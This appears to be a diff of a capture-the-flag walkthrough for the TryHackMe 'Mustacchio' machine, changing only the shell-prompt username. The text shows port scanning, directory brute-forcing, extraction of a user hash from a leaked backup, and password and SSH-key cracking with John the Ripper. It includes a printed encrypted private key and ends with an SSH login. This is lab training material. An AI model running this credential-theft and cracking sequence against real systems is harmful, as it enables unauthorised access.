@@ -15,7 +15,7 @@ Deploy and compromise the machine!
 We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md):
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
 └─$ rustscan -a mustacchio.thm -- -A 
 
 Open 10.10.218.105:22
@@ -45,7 +45,7 @@ http-methods:
 ### Gobuster
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -u http://mustacchio.thm         
 /.hta                 (Status: 403) [Size: 279]
 /.htpasswd            (Status: 403) [Size: 279]
@@ -64,7 +64,7 @@ in /custom we find a backup let's download it .
 It is a sqlite database backup, let's use [SQLite3](SQLite3.md) to read it:
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
 └─$ sqlite3 users.bak                                              
 SQLite version 3.46.1 2024-08-13 09:16:08
 
@@ -84,7 +84,7 @@ COMMIT;
 We can use [HashIdentifier](../../3%20-%20Tags/Hacking%20Tools/HashIdentifier.md) to determine which type of hash it is:
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
 └─$ hashid '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b'                                                                  
 Analyzing '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b'
 [+] SHA-1 
@@ -103,7 +103,7 @@ Analyzing '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b'
 We can now crack it with [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md):
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
 └─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt          
 Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
 Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
@@ -143,7 +143,7 @@ We also have :
 Let's go to the page to download and open it:
 
 ```
-──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
+──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
 └─$ cat dontforget.bak 
 <?xml version="1.0" encoding="UTF-8"?>
 <comment>
@@ -178,7 +178,7 @@ ve been playing with your dog, or eating your cat, but no. You want to read this
 We use [Ssh2john](../../3%20-%20Tags/Hacking%20Tools/Ssh2john.md) after `chmod 600 key`:
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
 └─$ cat barry_id 
 -----BEGIN RSA PRIVATE KEY----- 
 Proc-Type: 4,ENCRYPTED 
@@ -187,10 +187,10 @@ DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
 jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk 4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8 7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+ T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7 LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF 6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs 7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of 1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ +Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD 
 -----END RSA PRIVATE KEY-----
 
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
 └─$ chmod +600 barry_id
 
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
 └─$ ssh2john barry_id > hash
 
 ```
@@ -200,7 +200,7 @@ jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9
 Now we can crack the hash with [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
 └─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -220,7 +220,7 @@ Session completed.
 Now we can use the key on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) and cat the user flag:
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Mustacchio]
 └─$ ssh -i barry_id barry@mustacchio.thm 
 Enter passphrase for key 'barry_id': 
 Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)
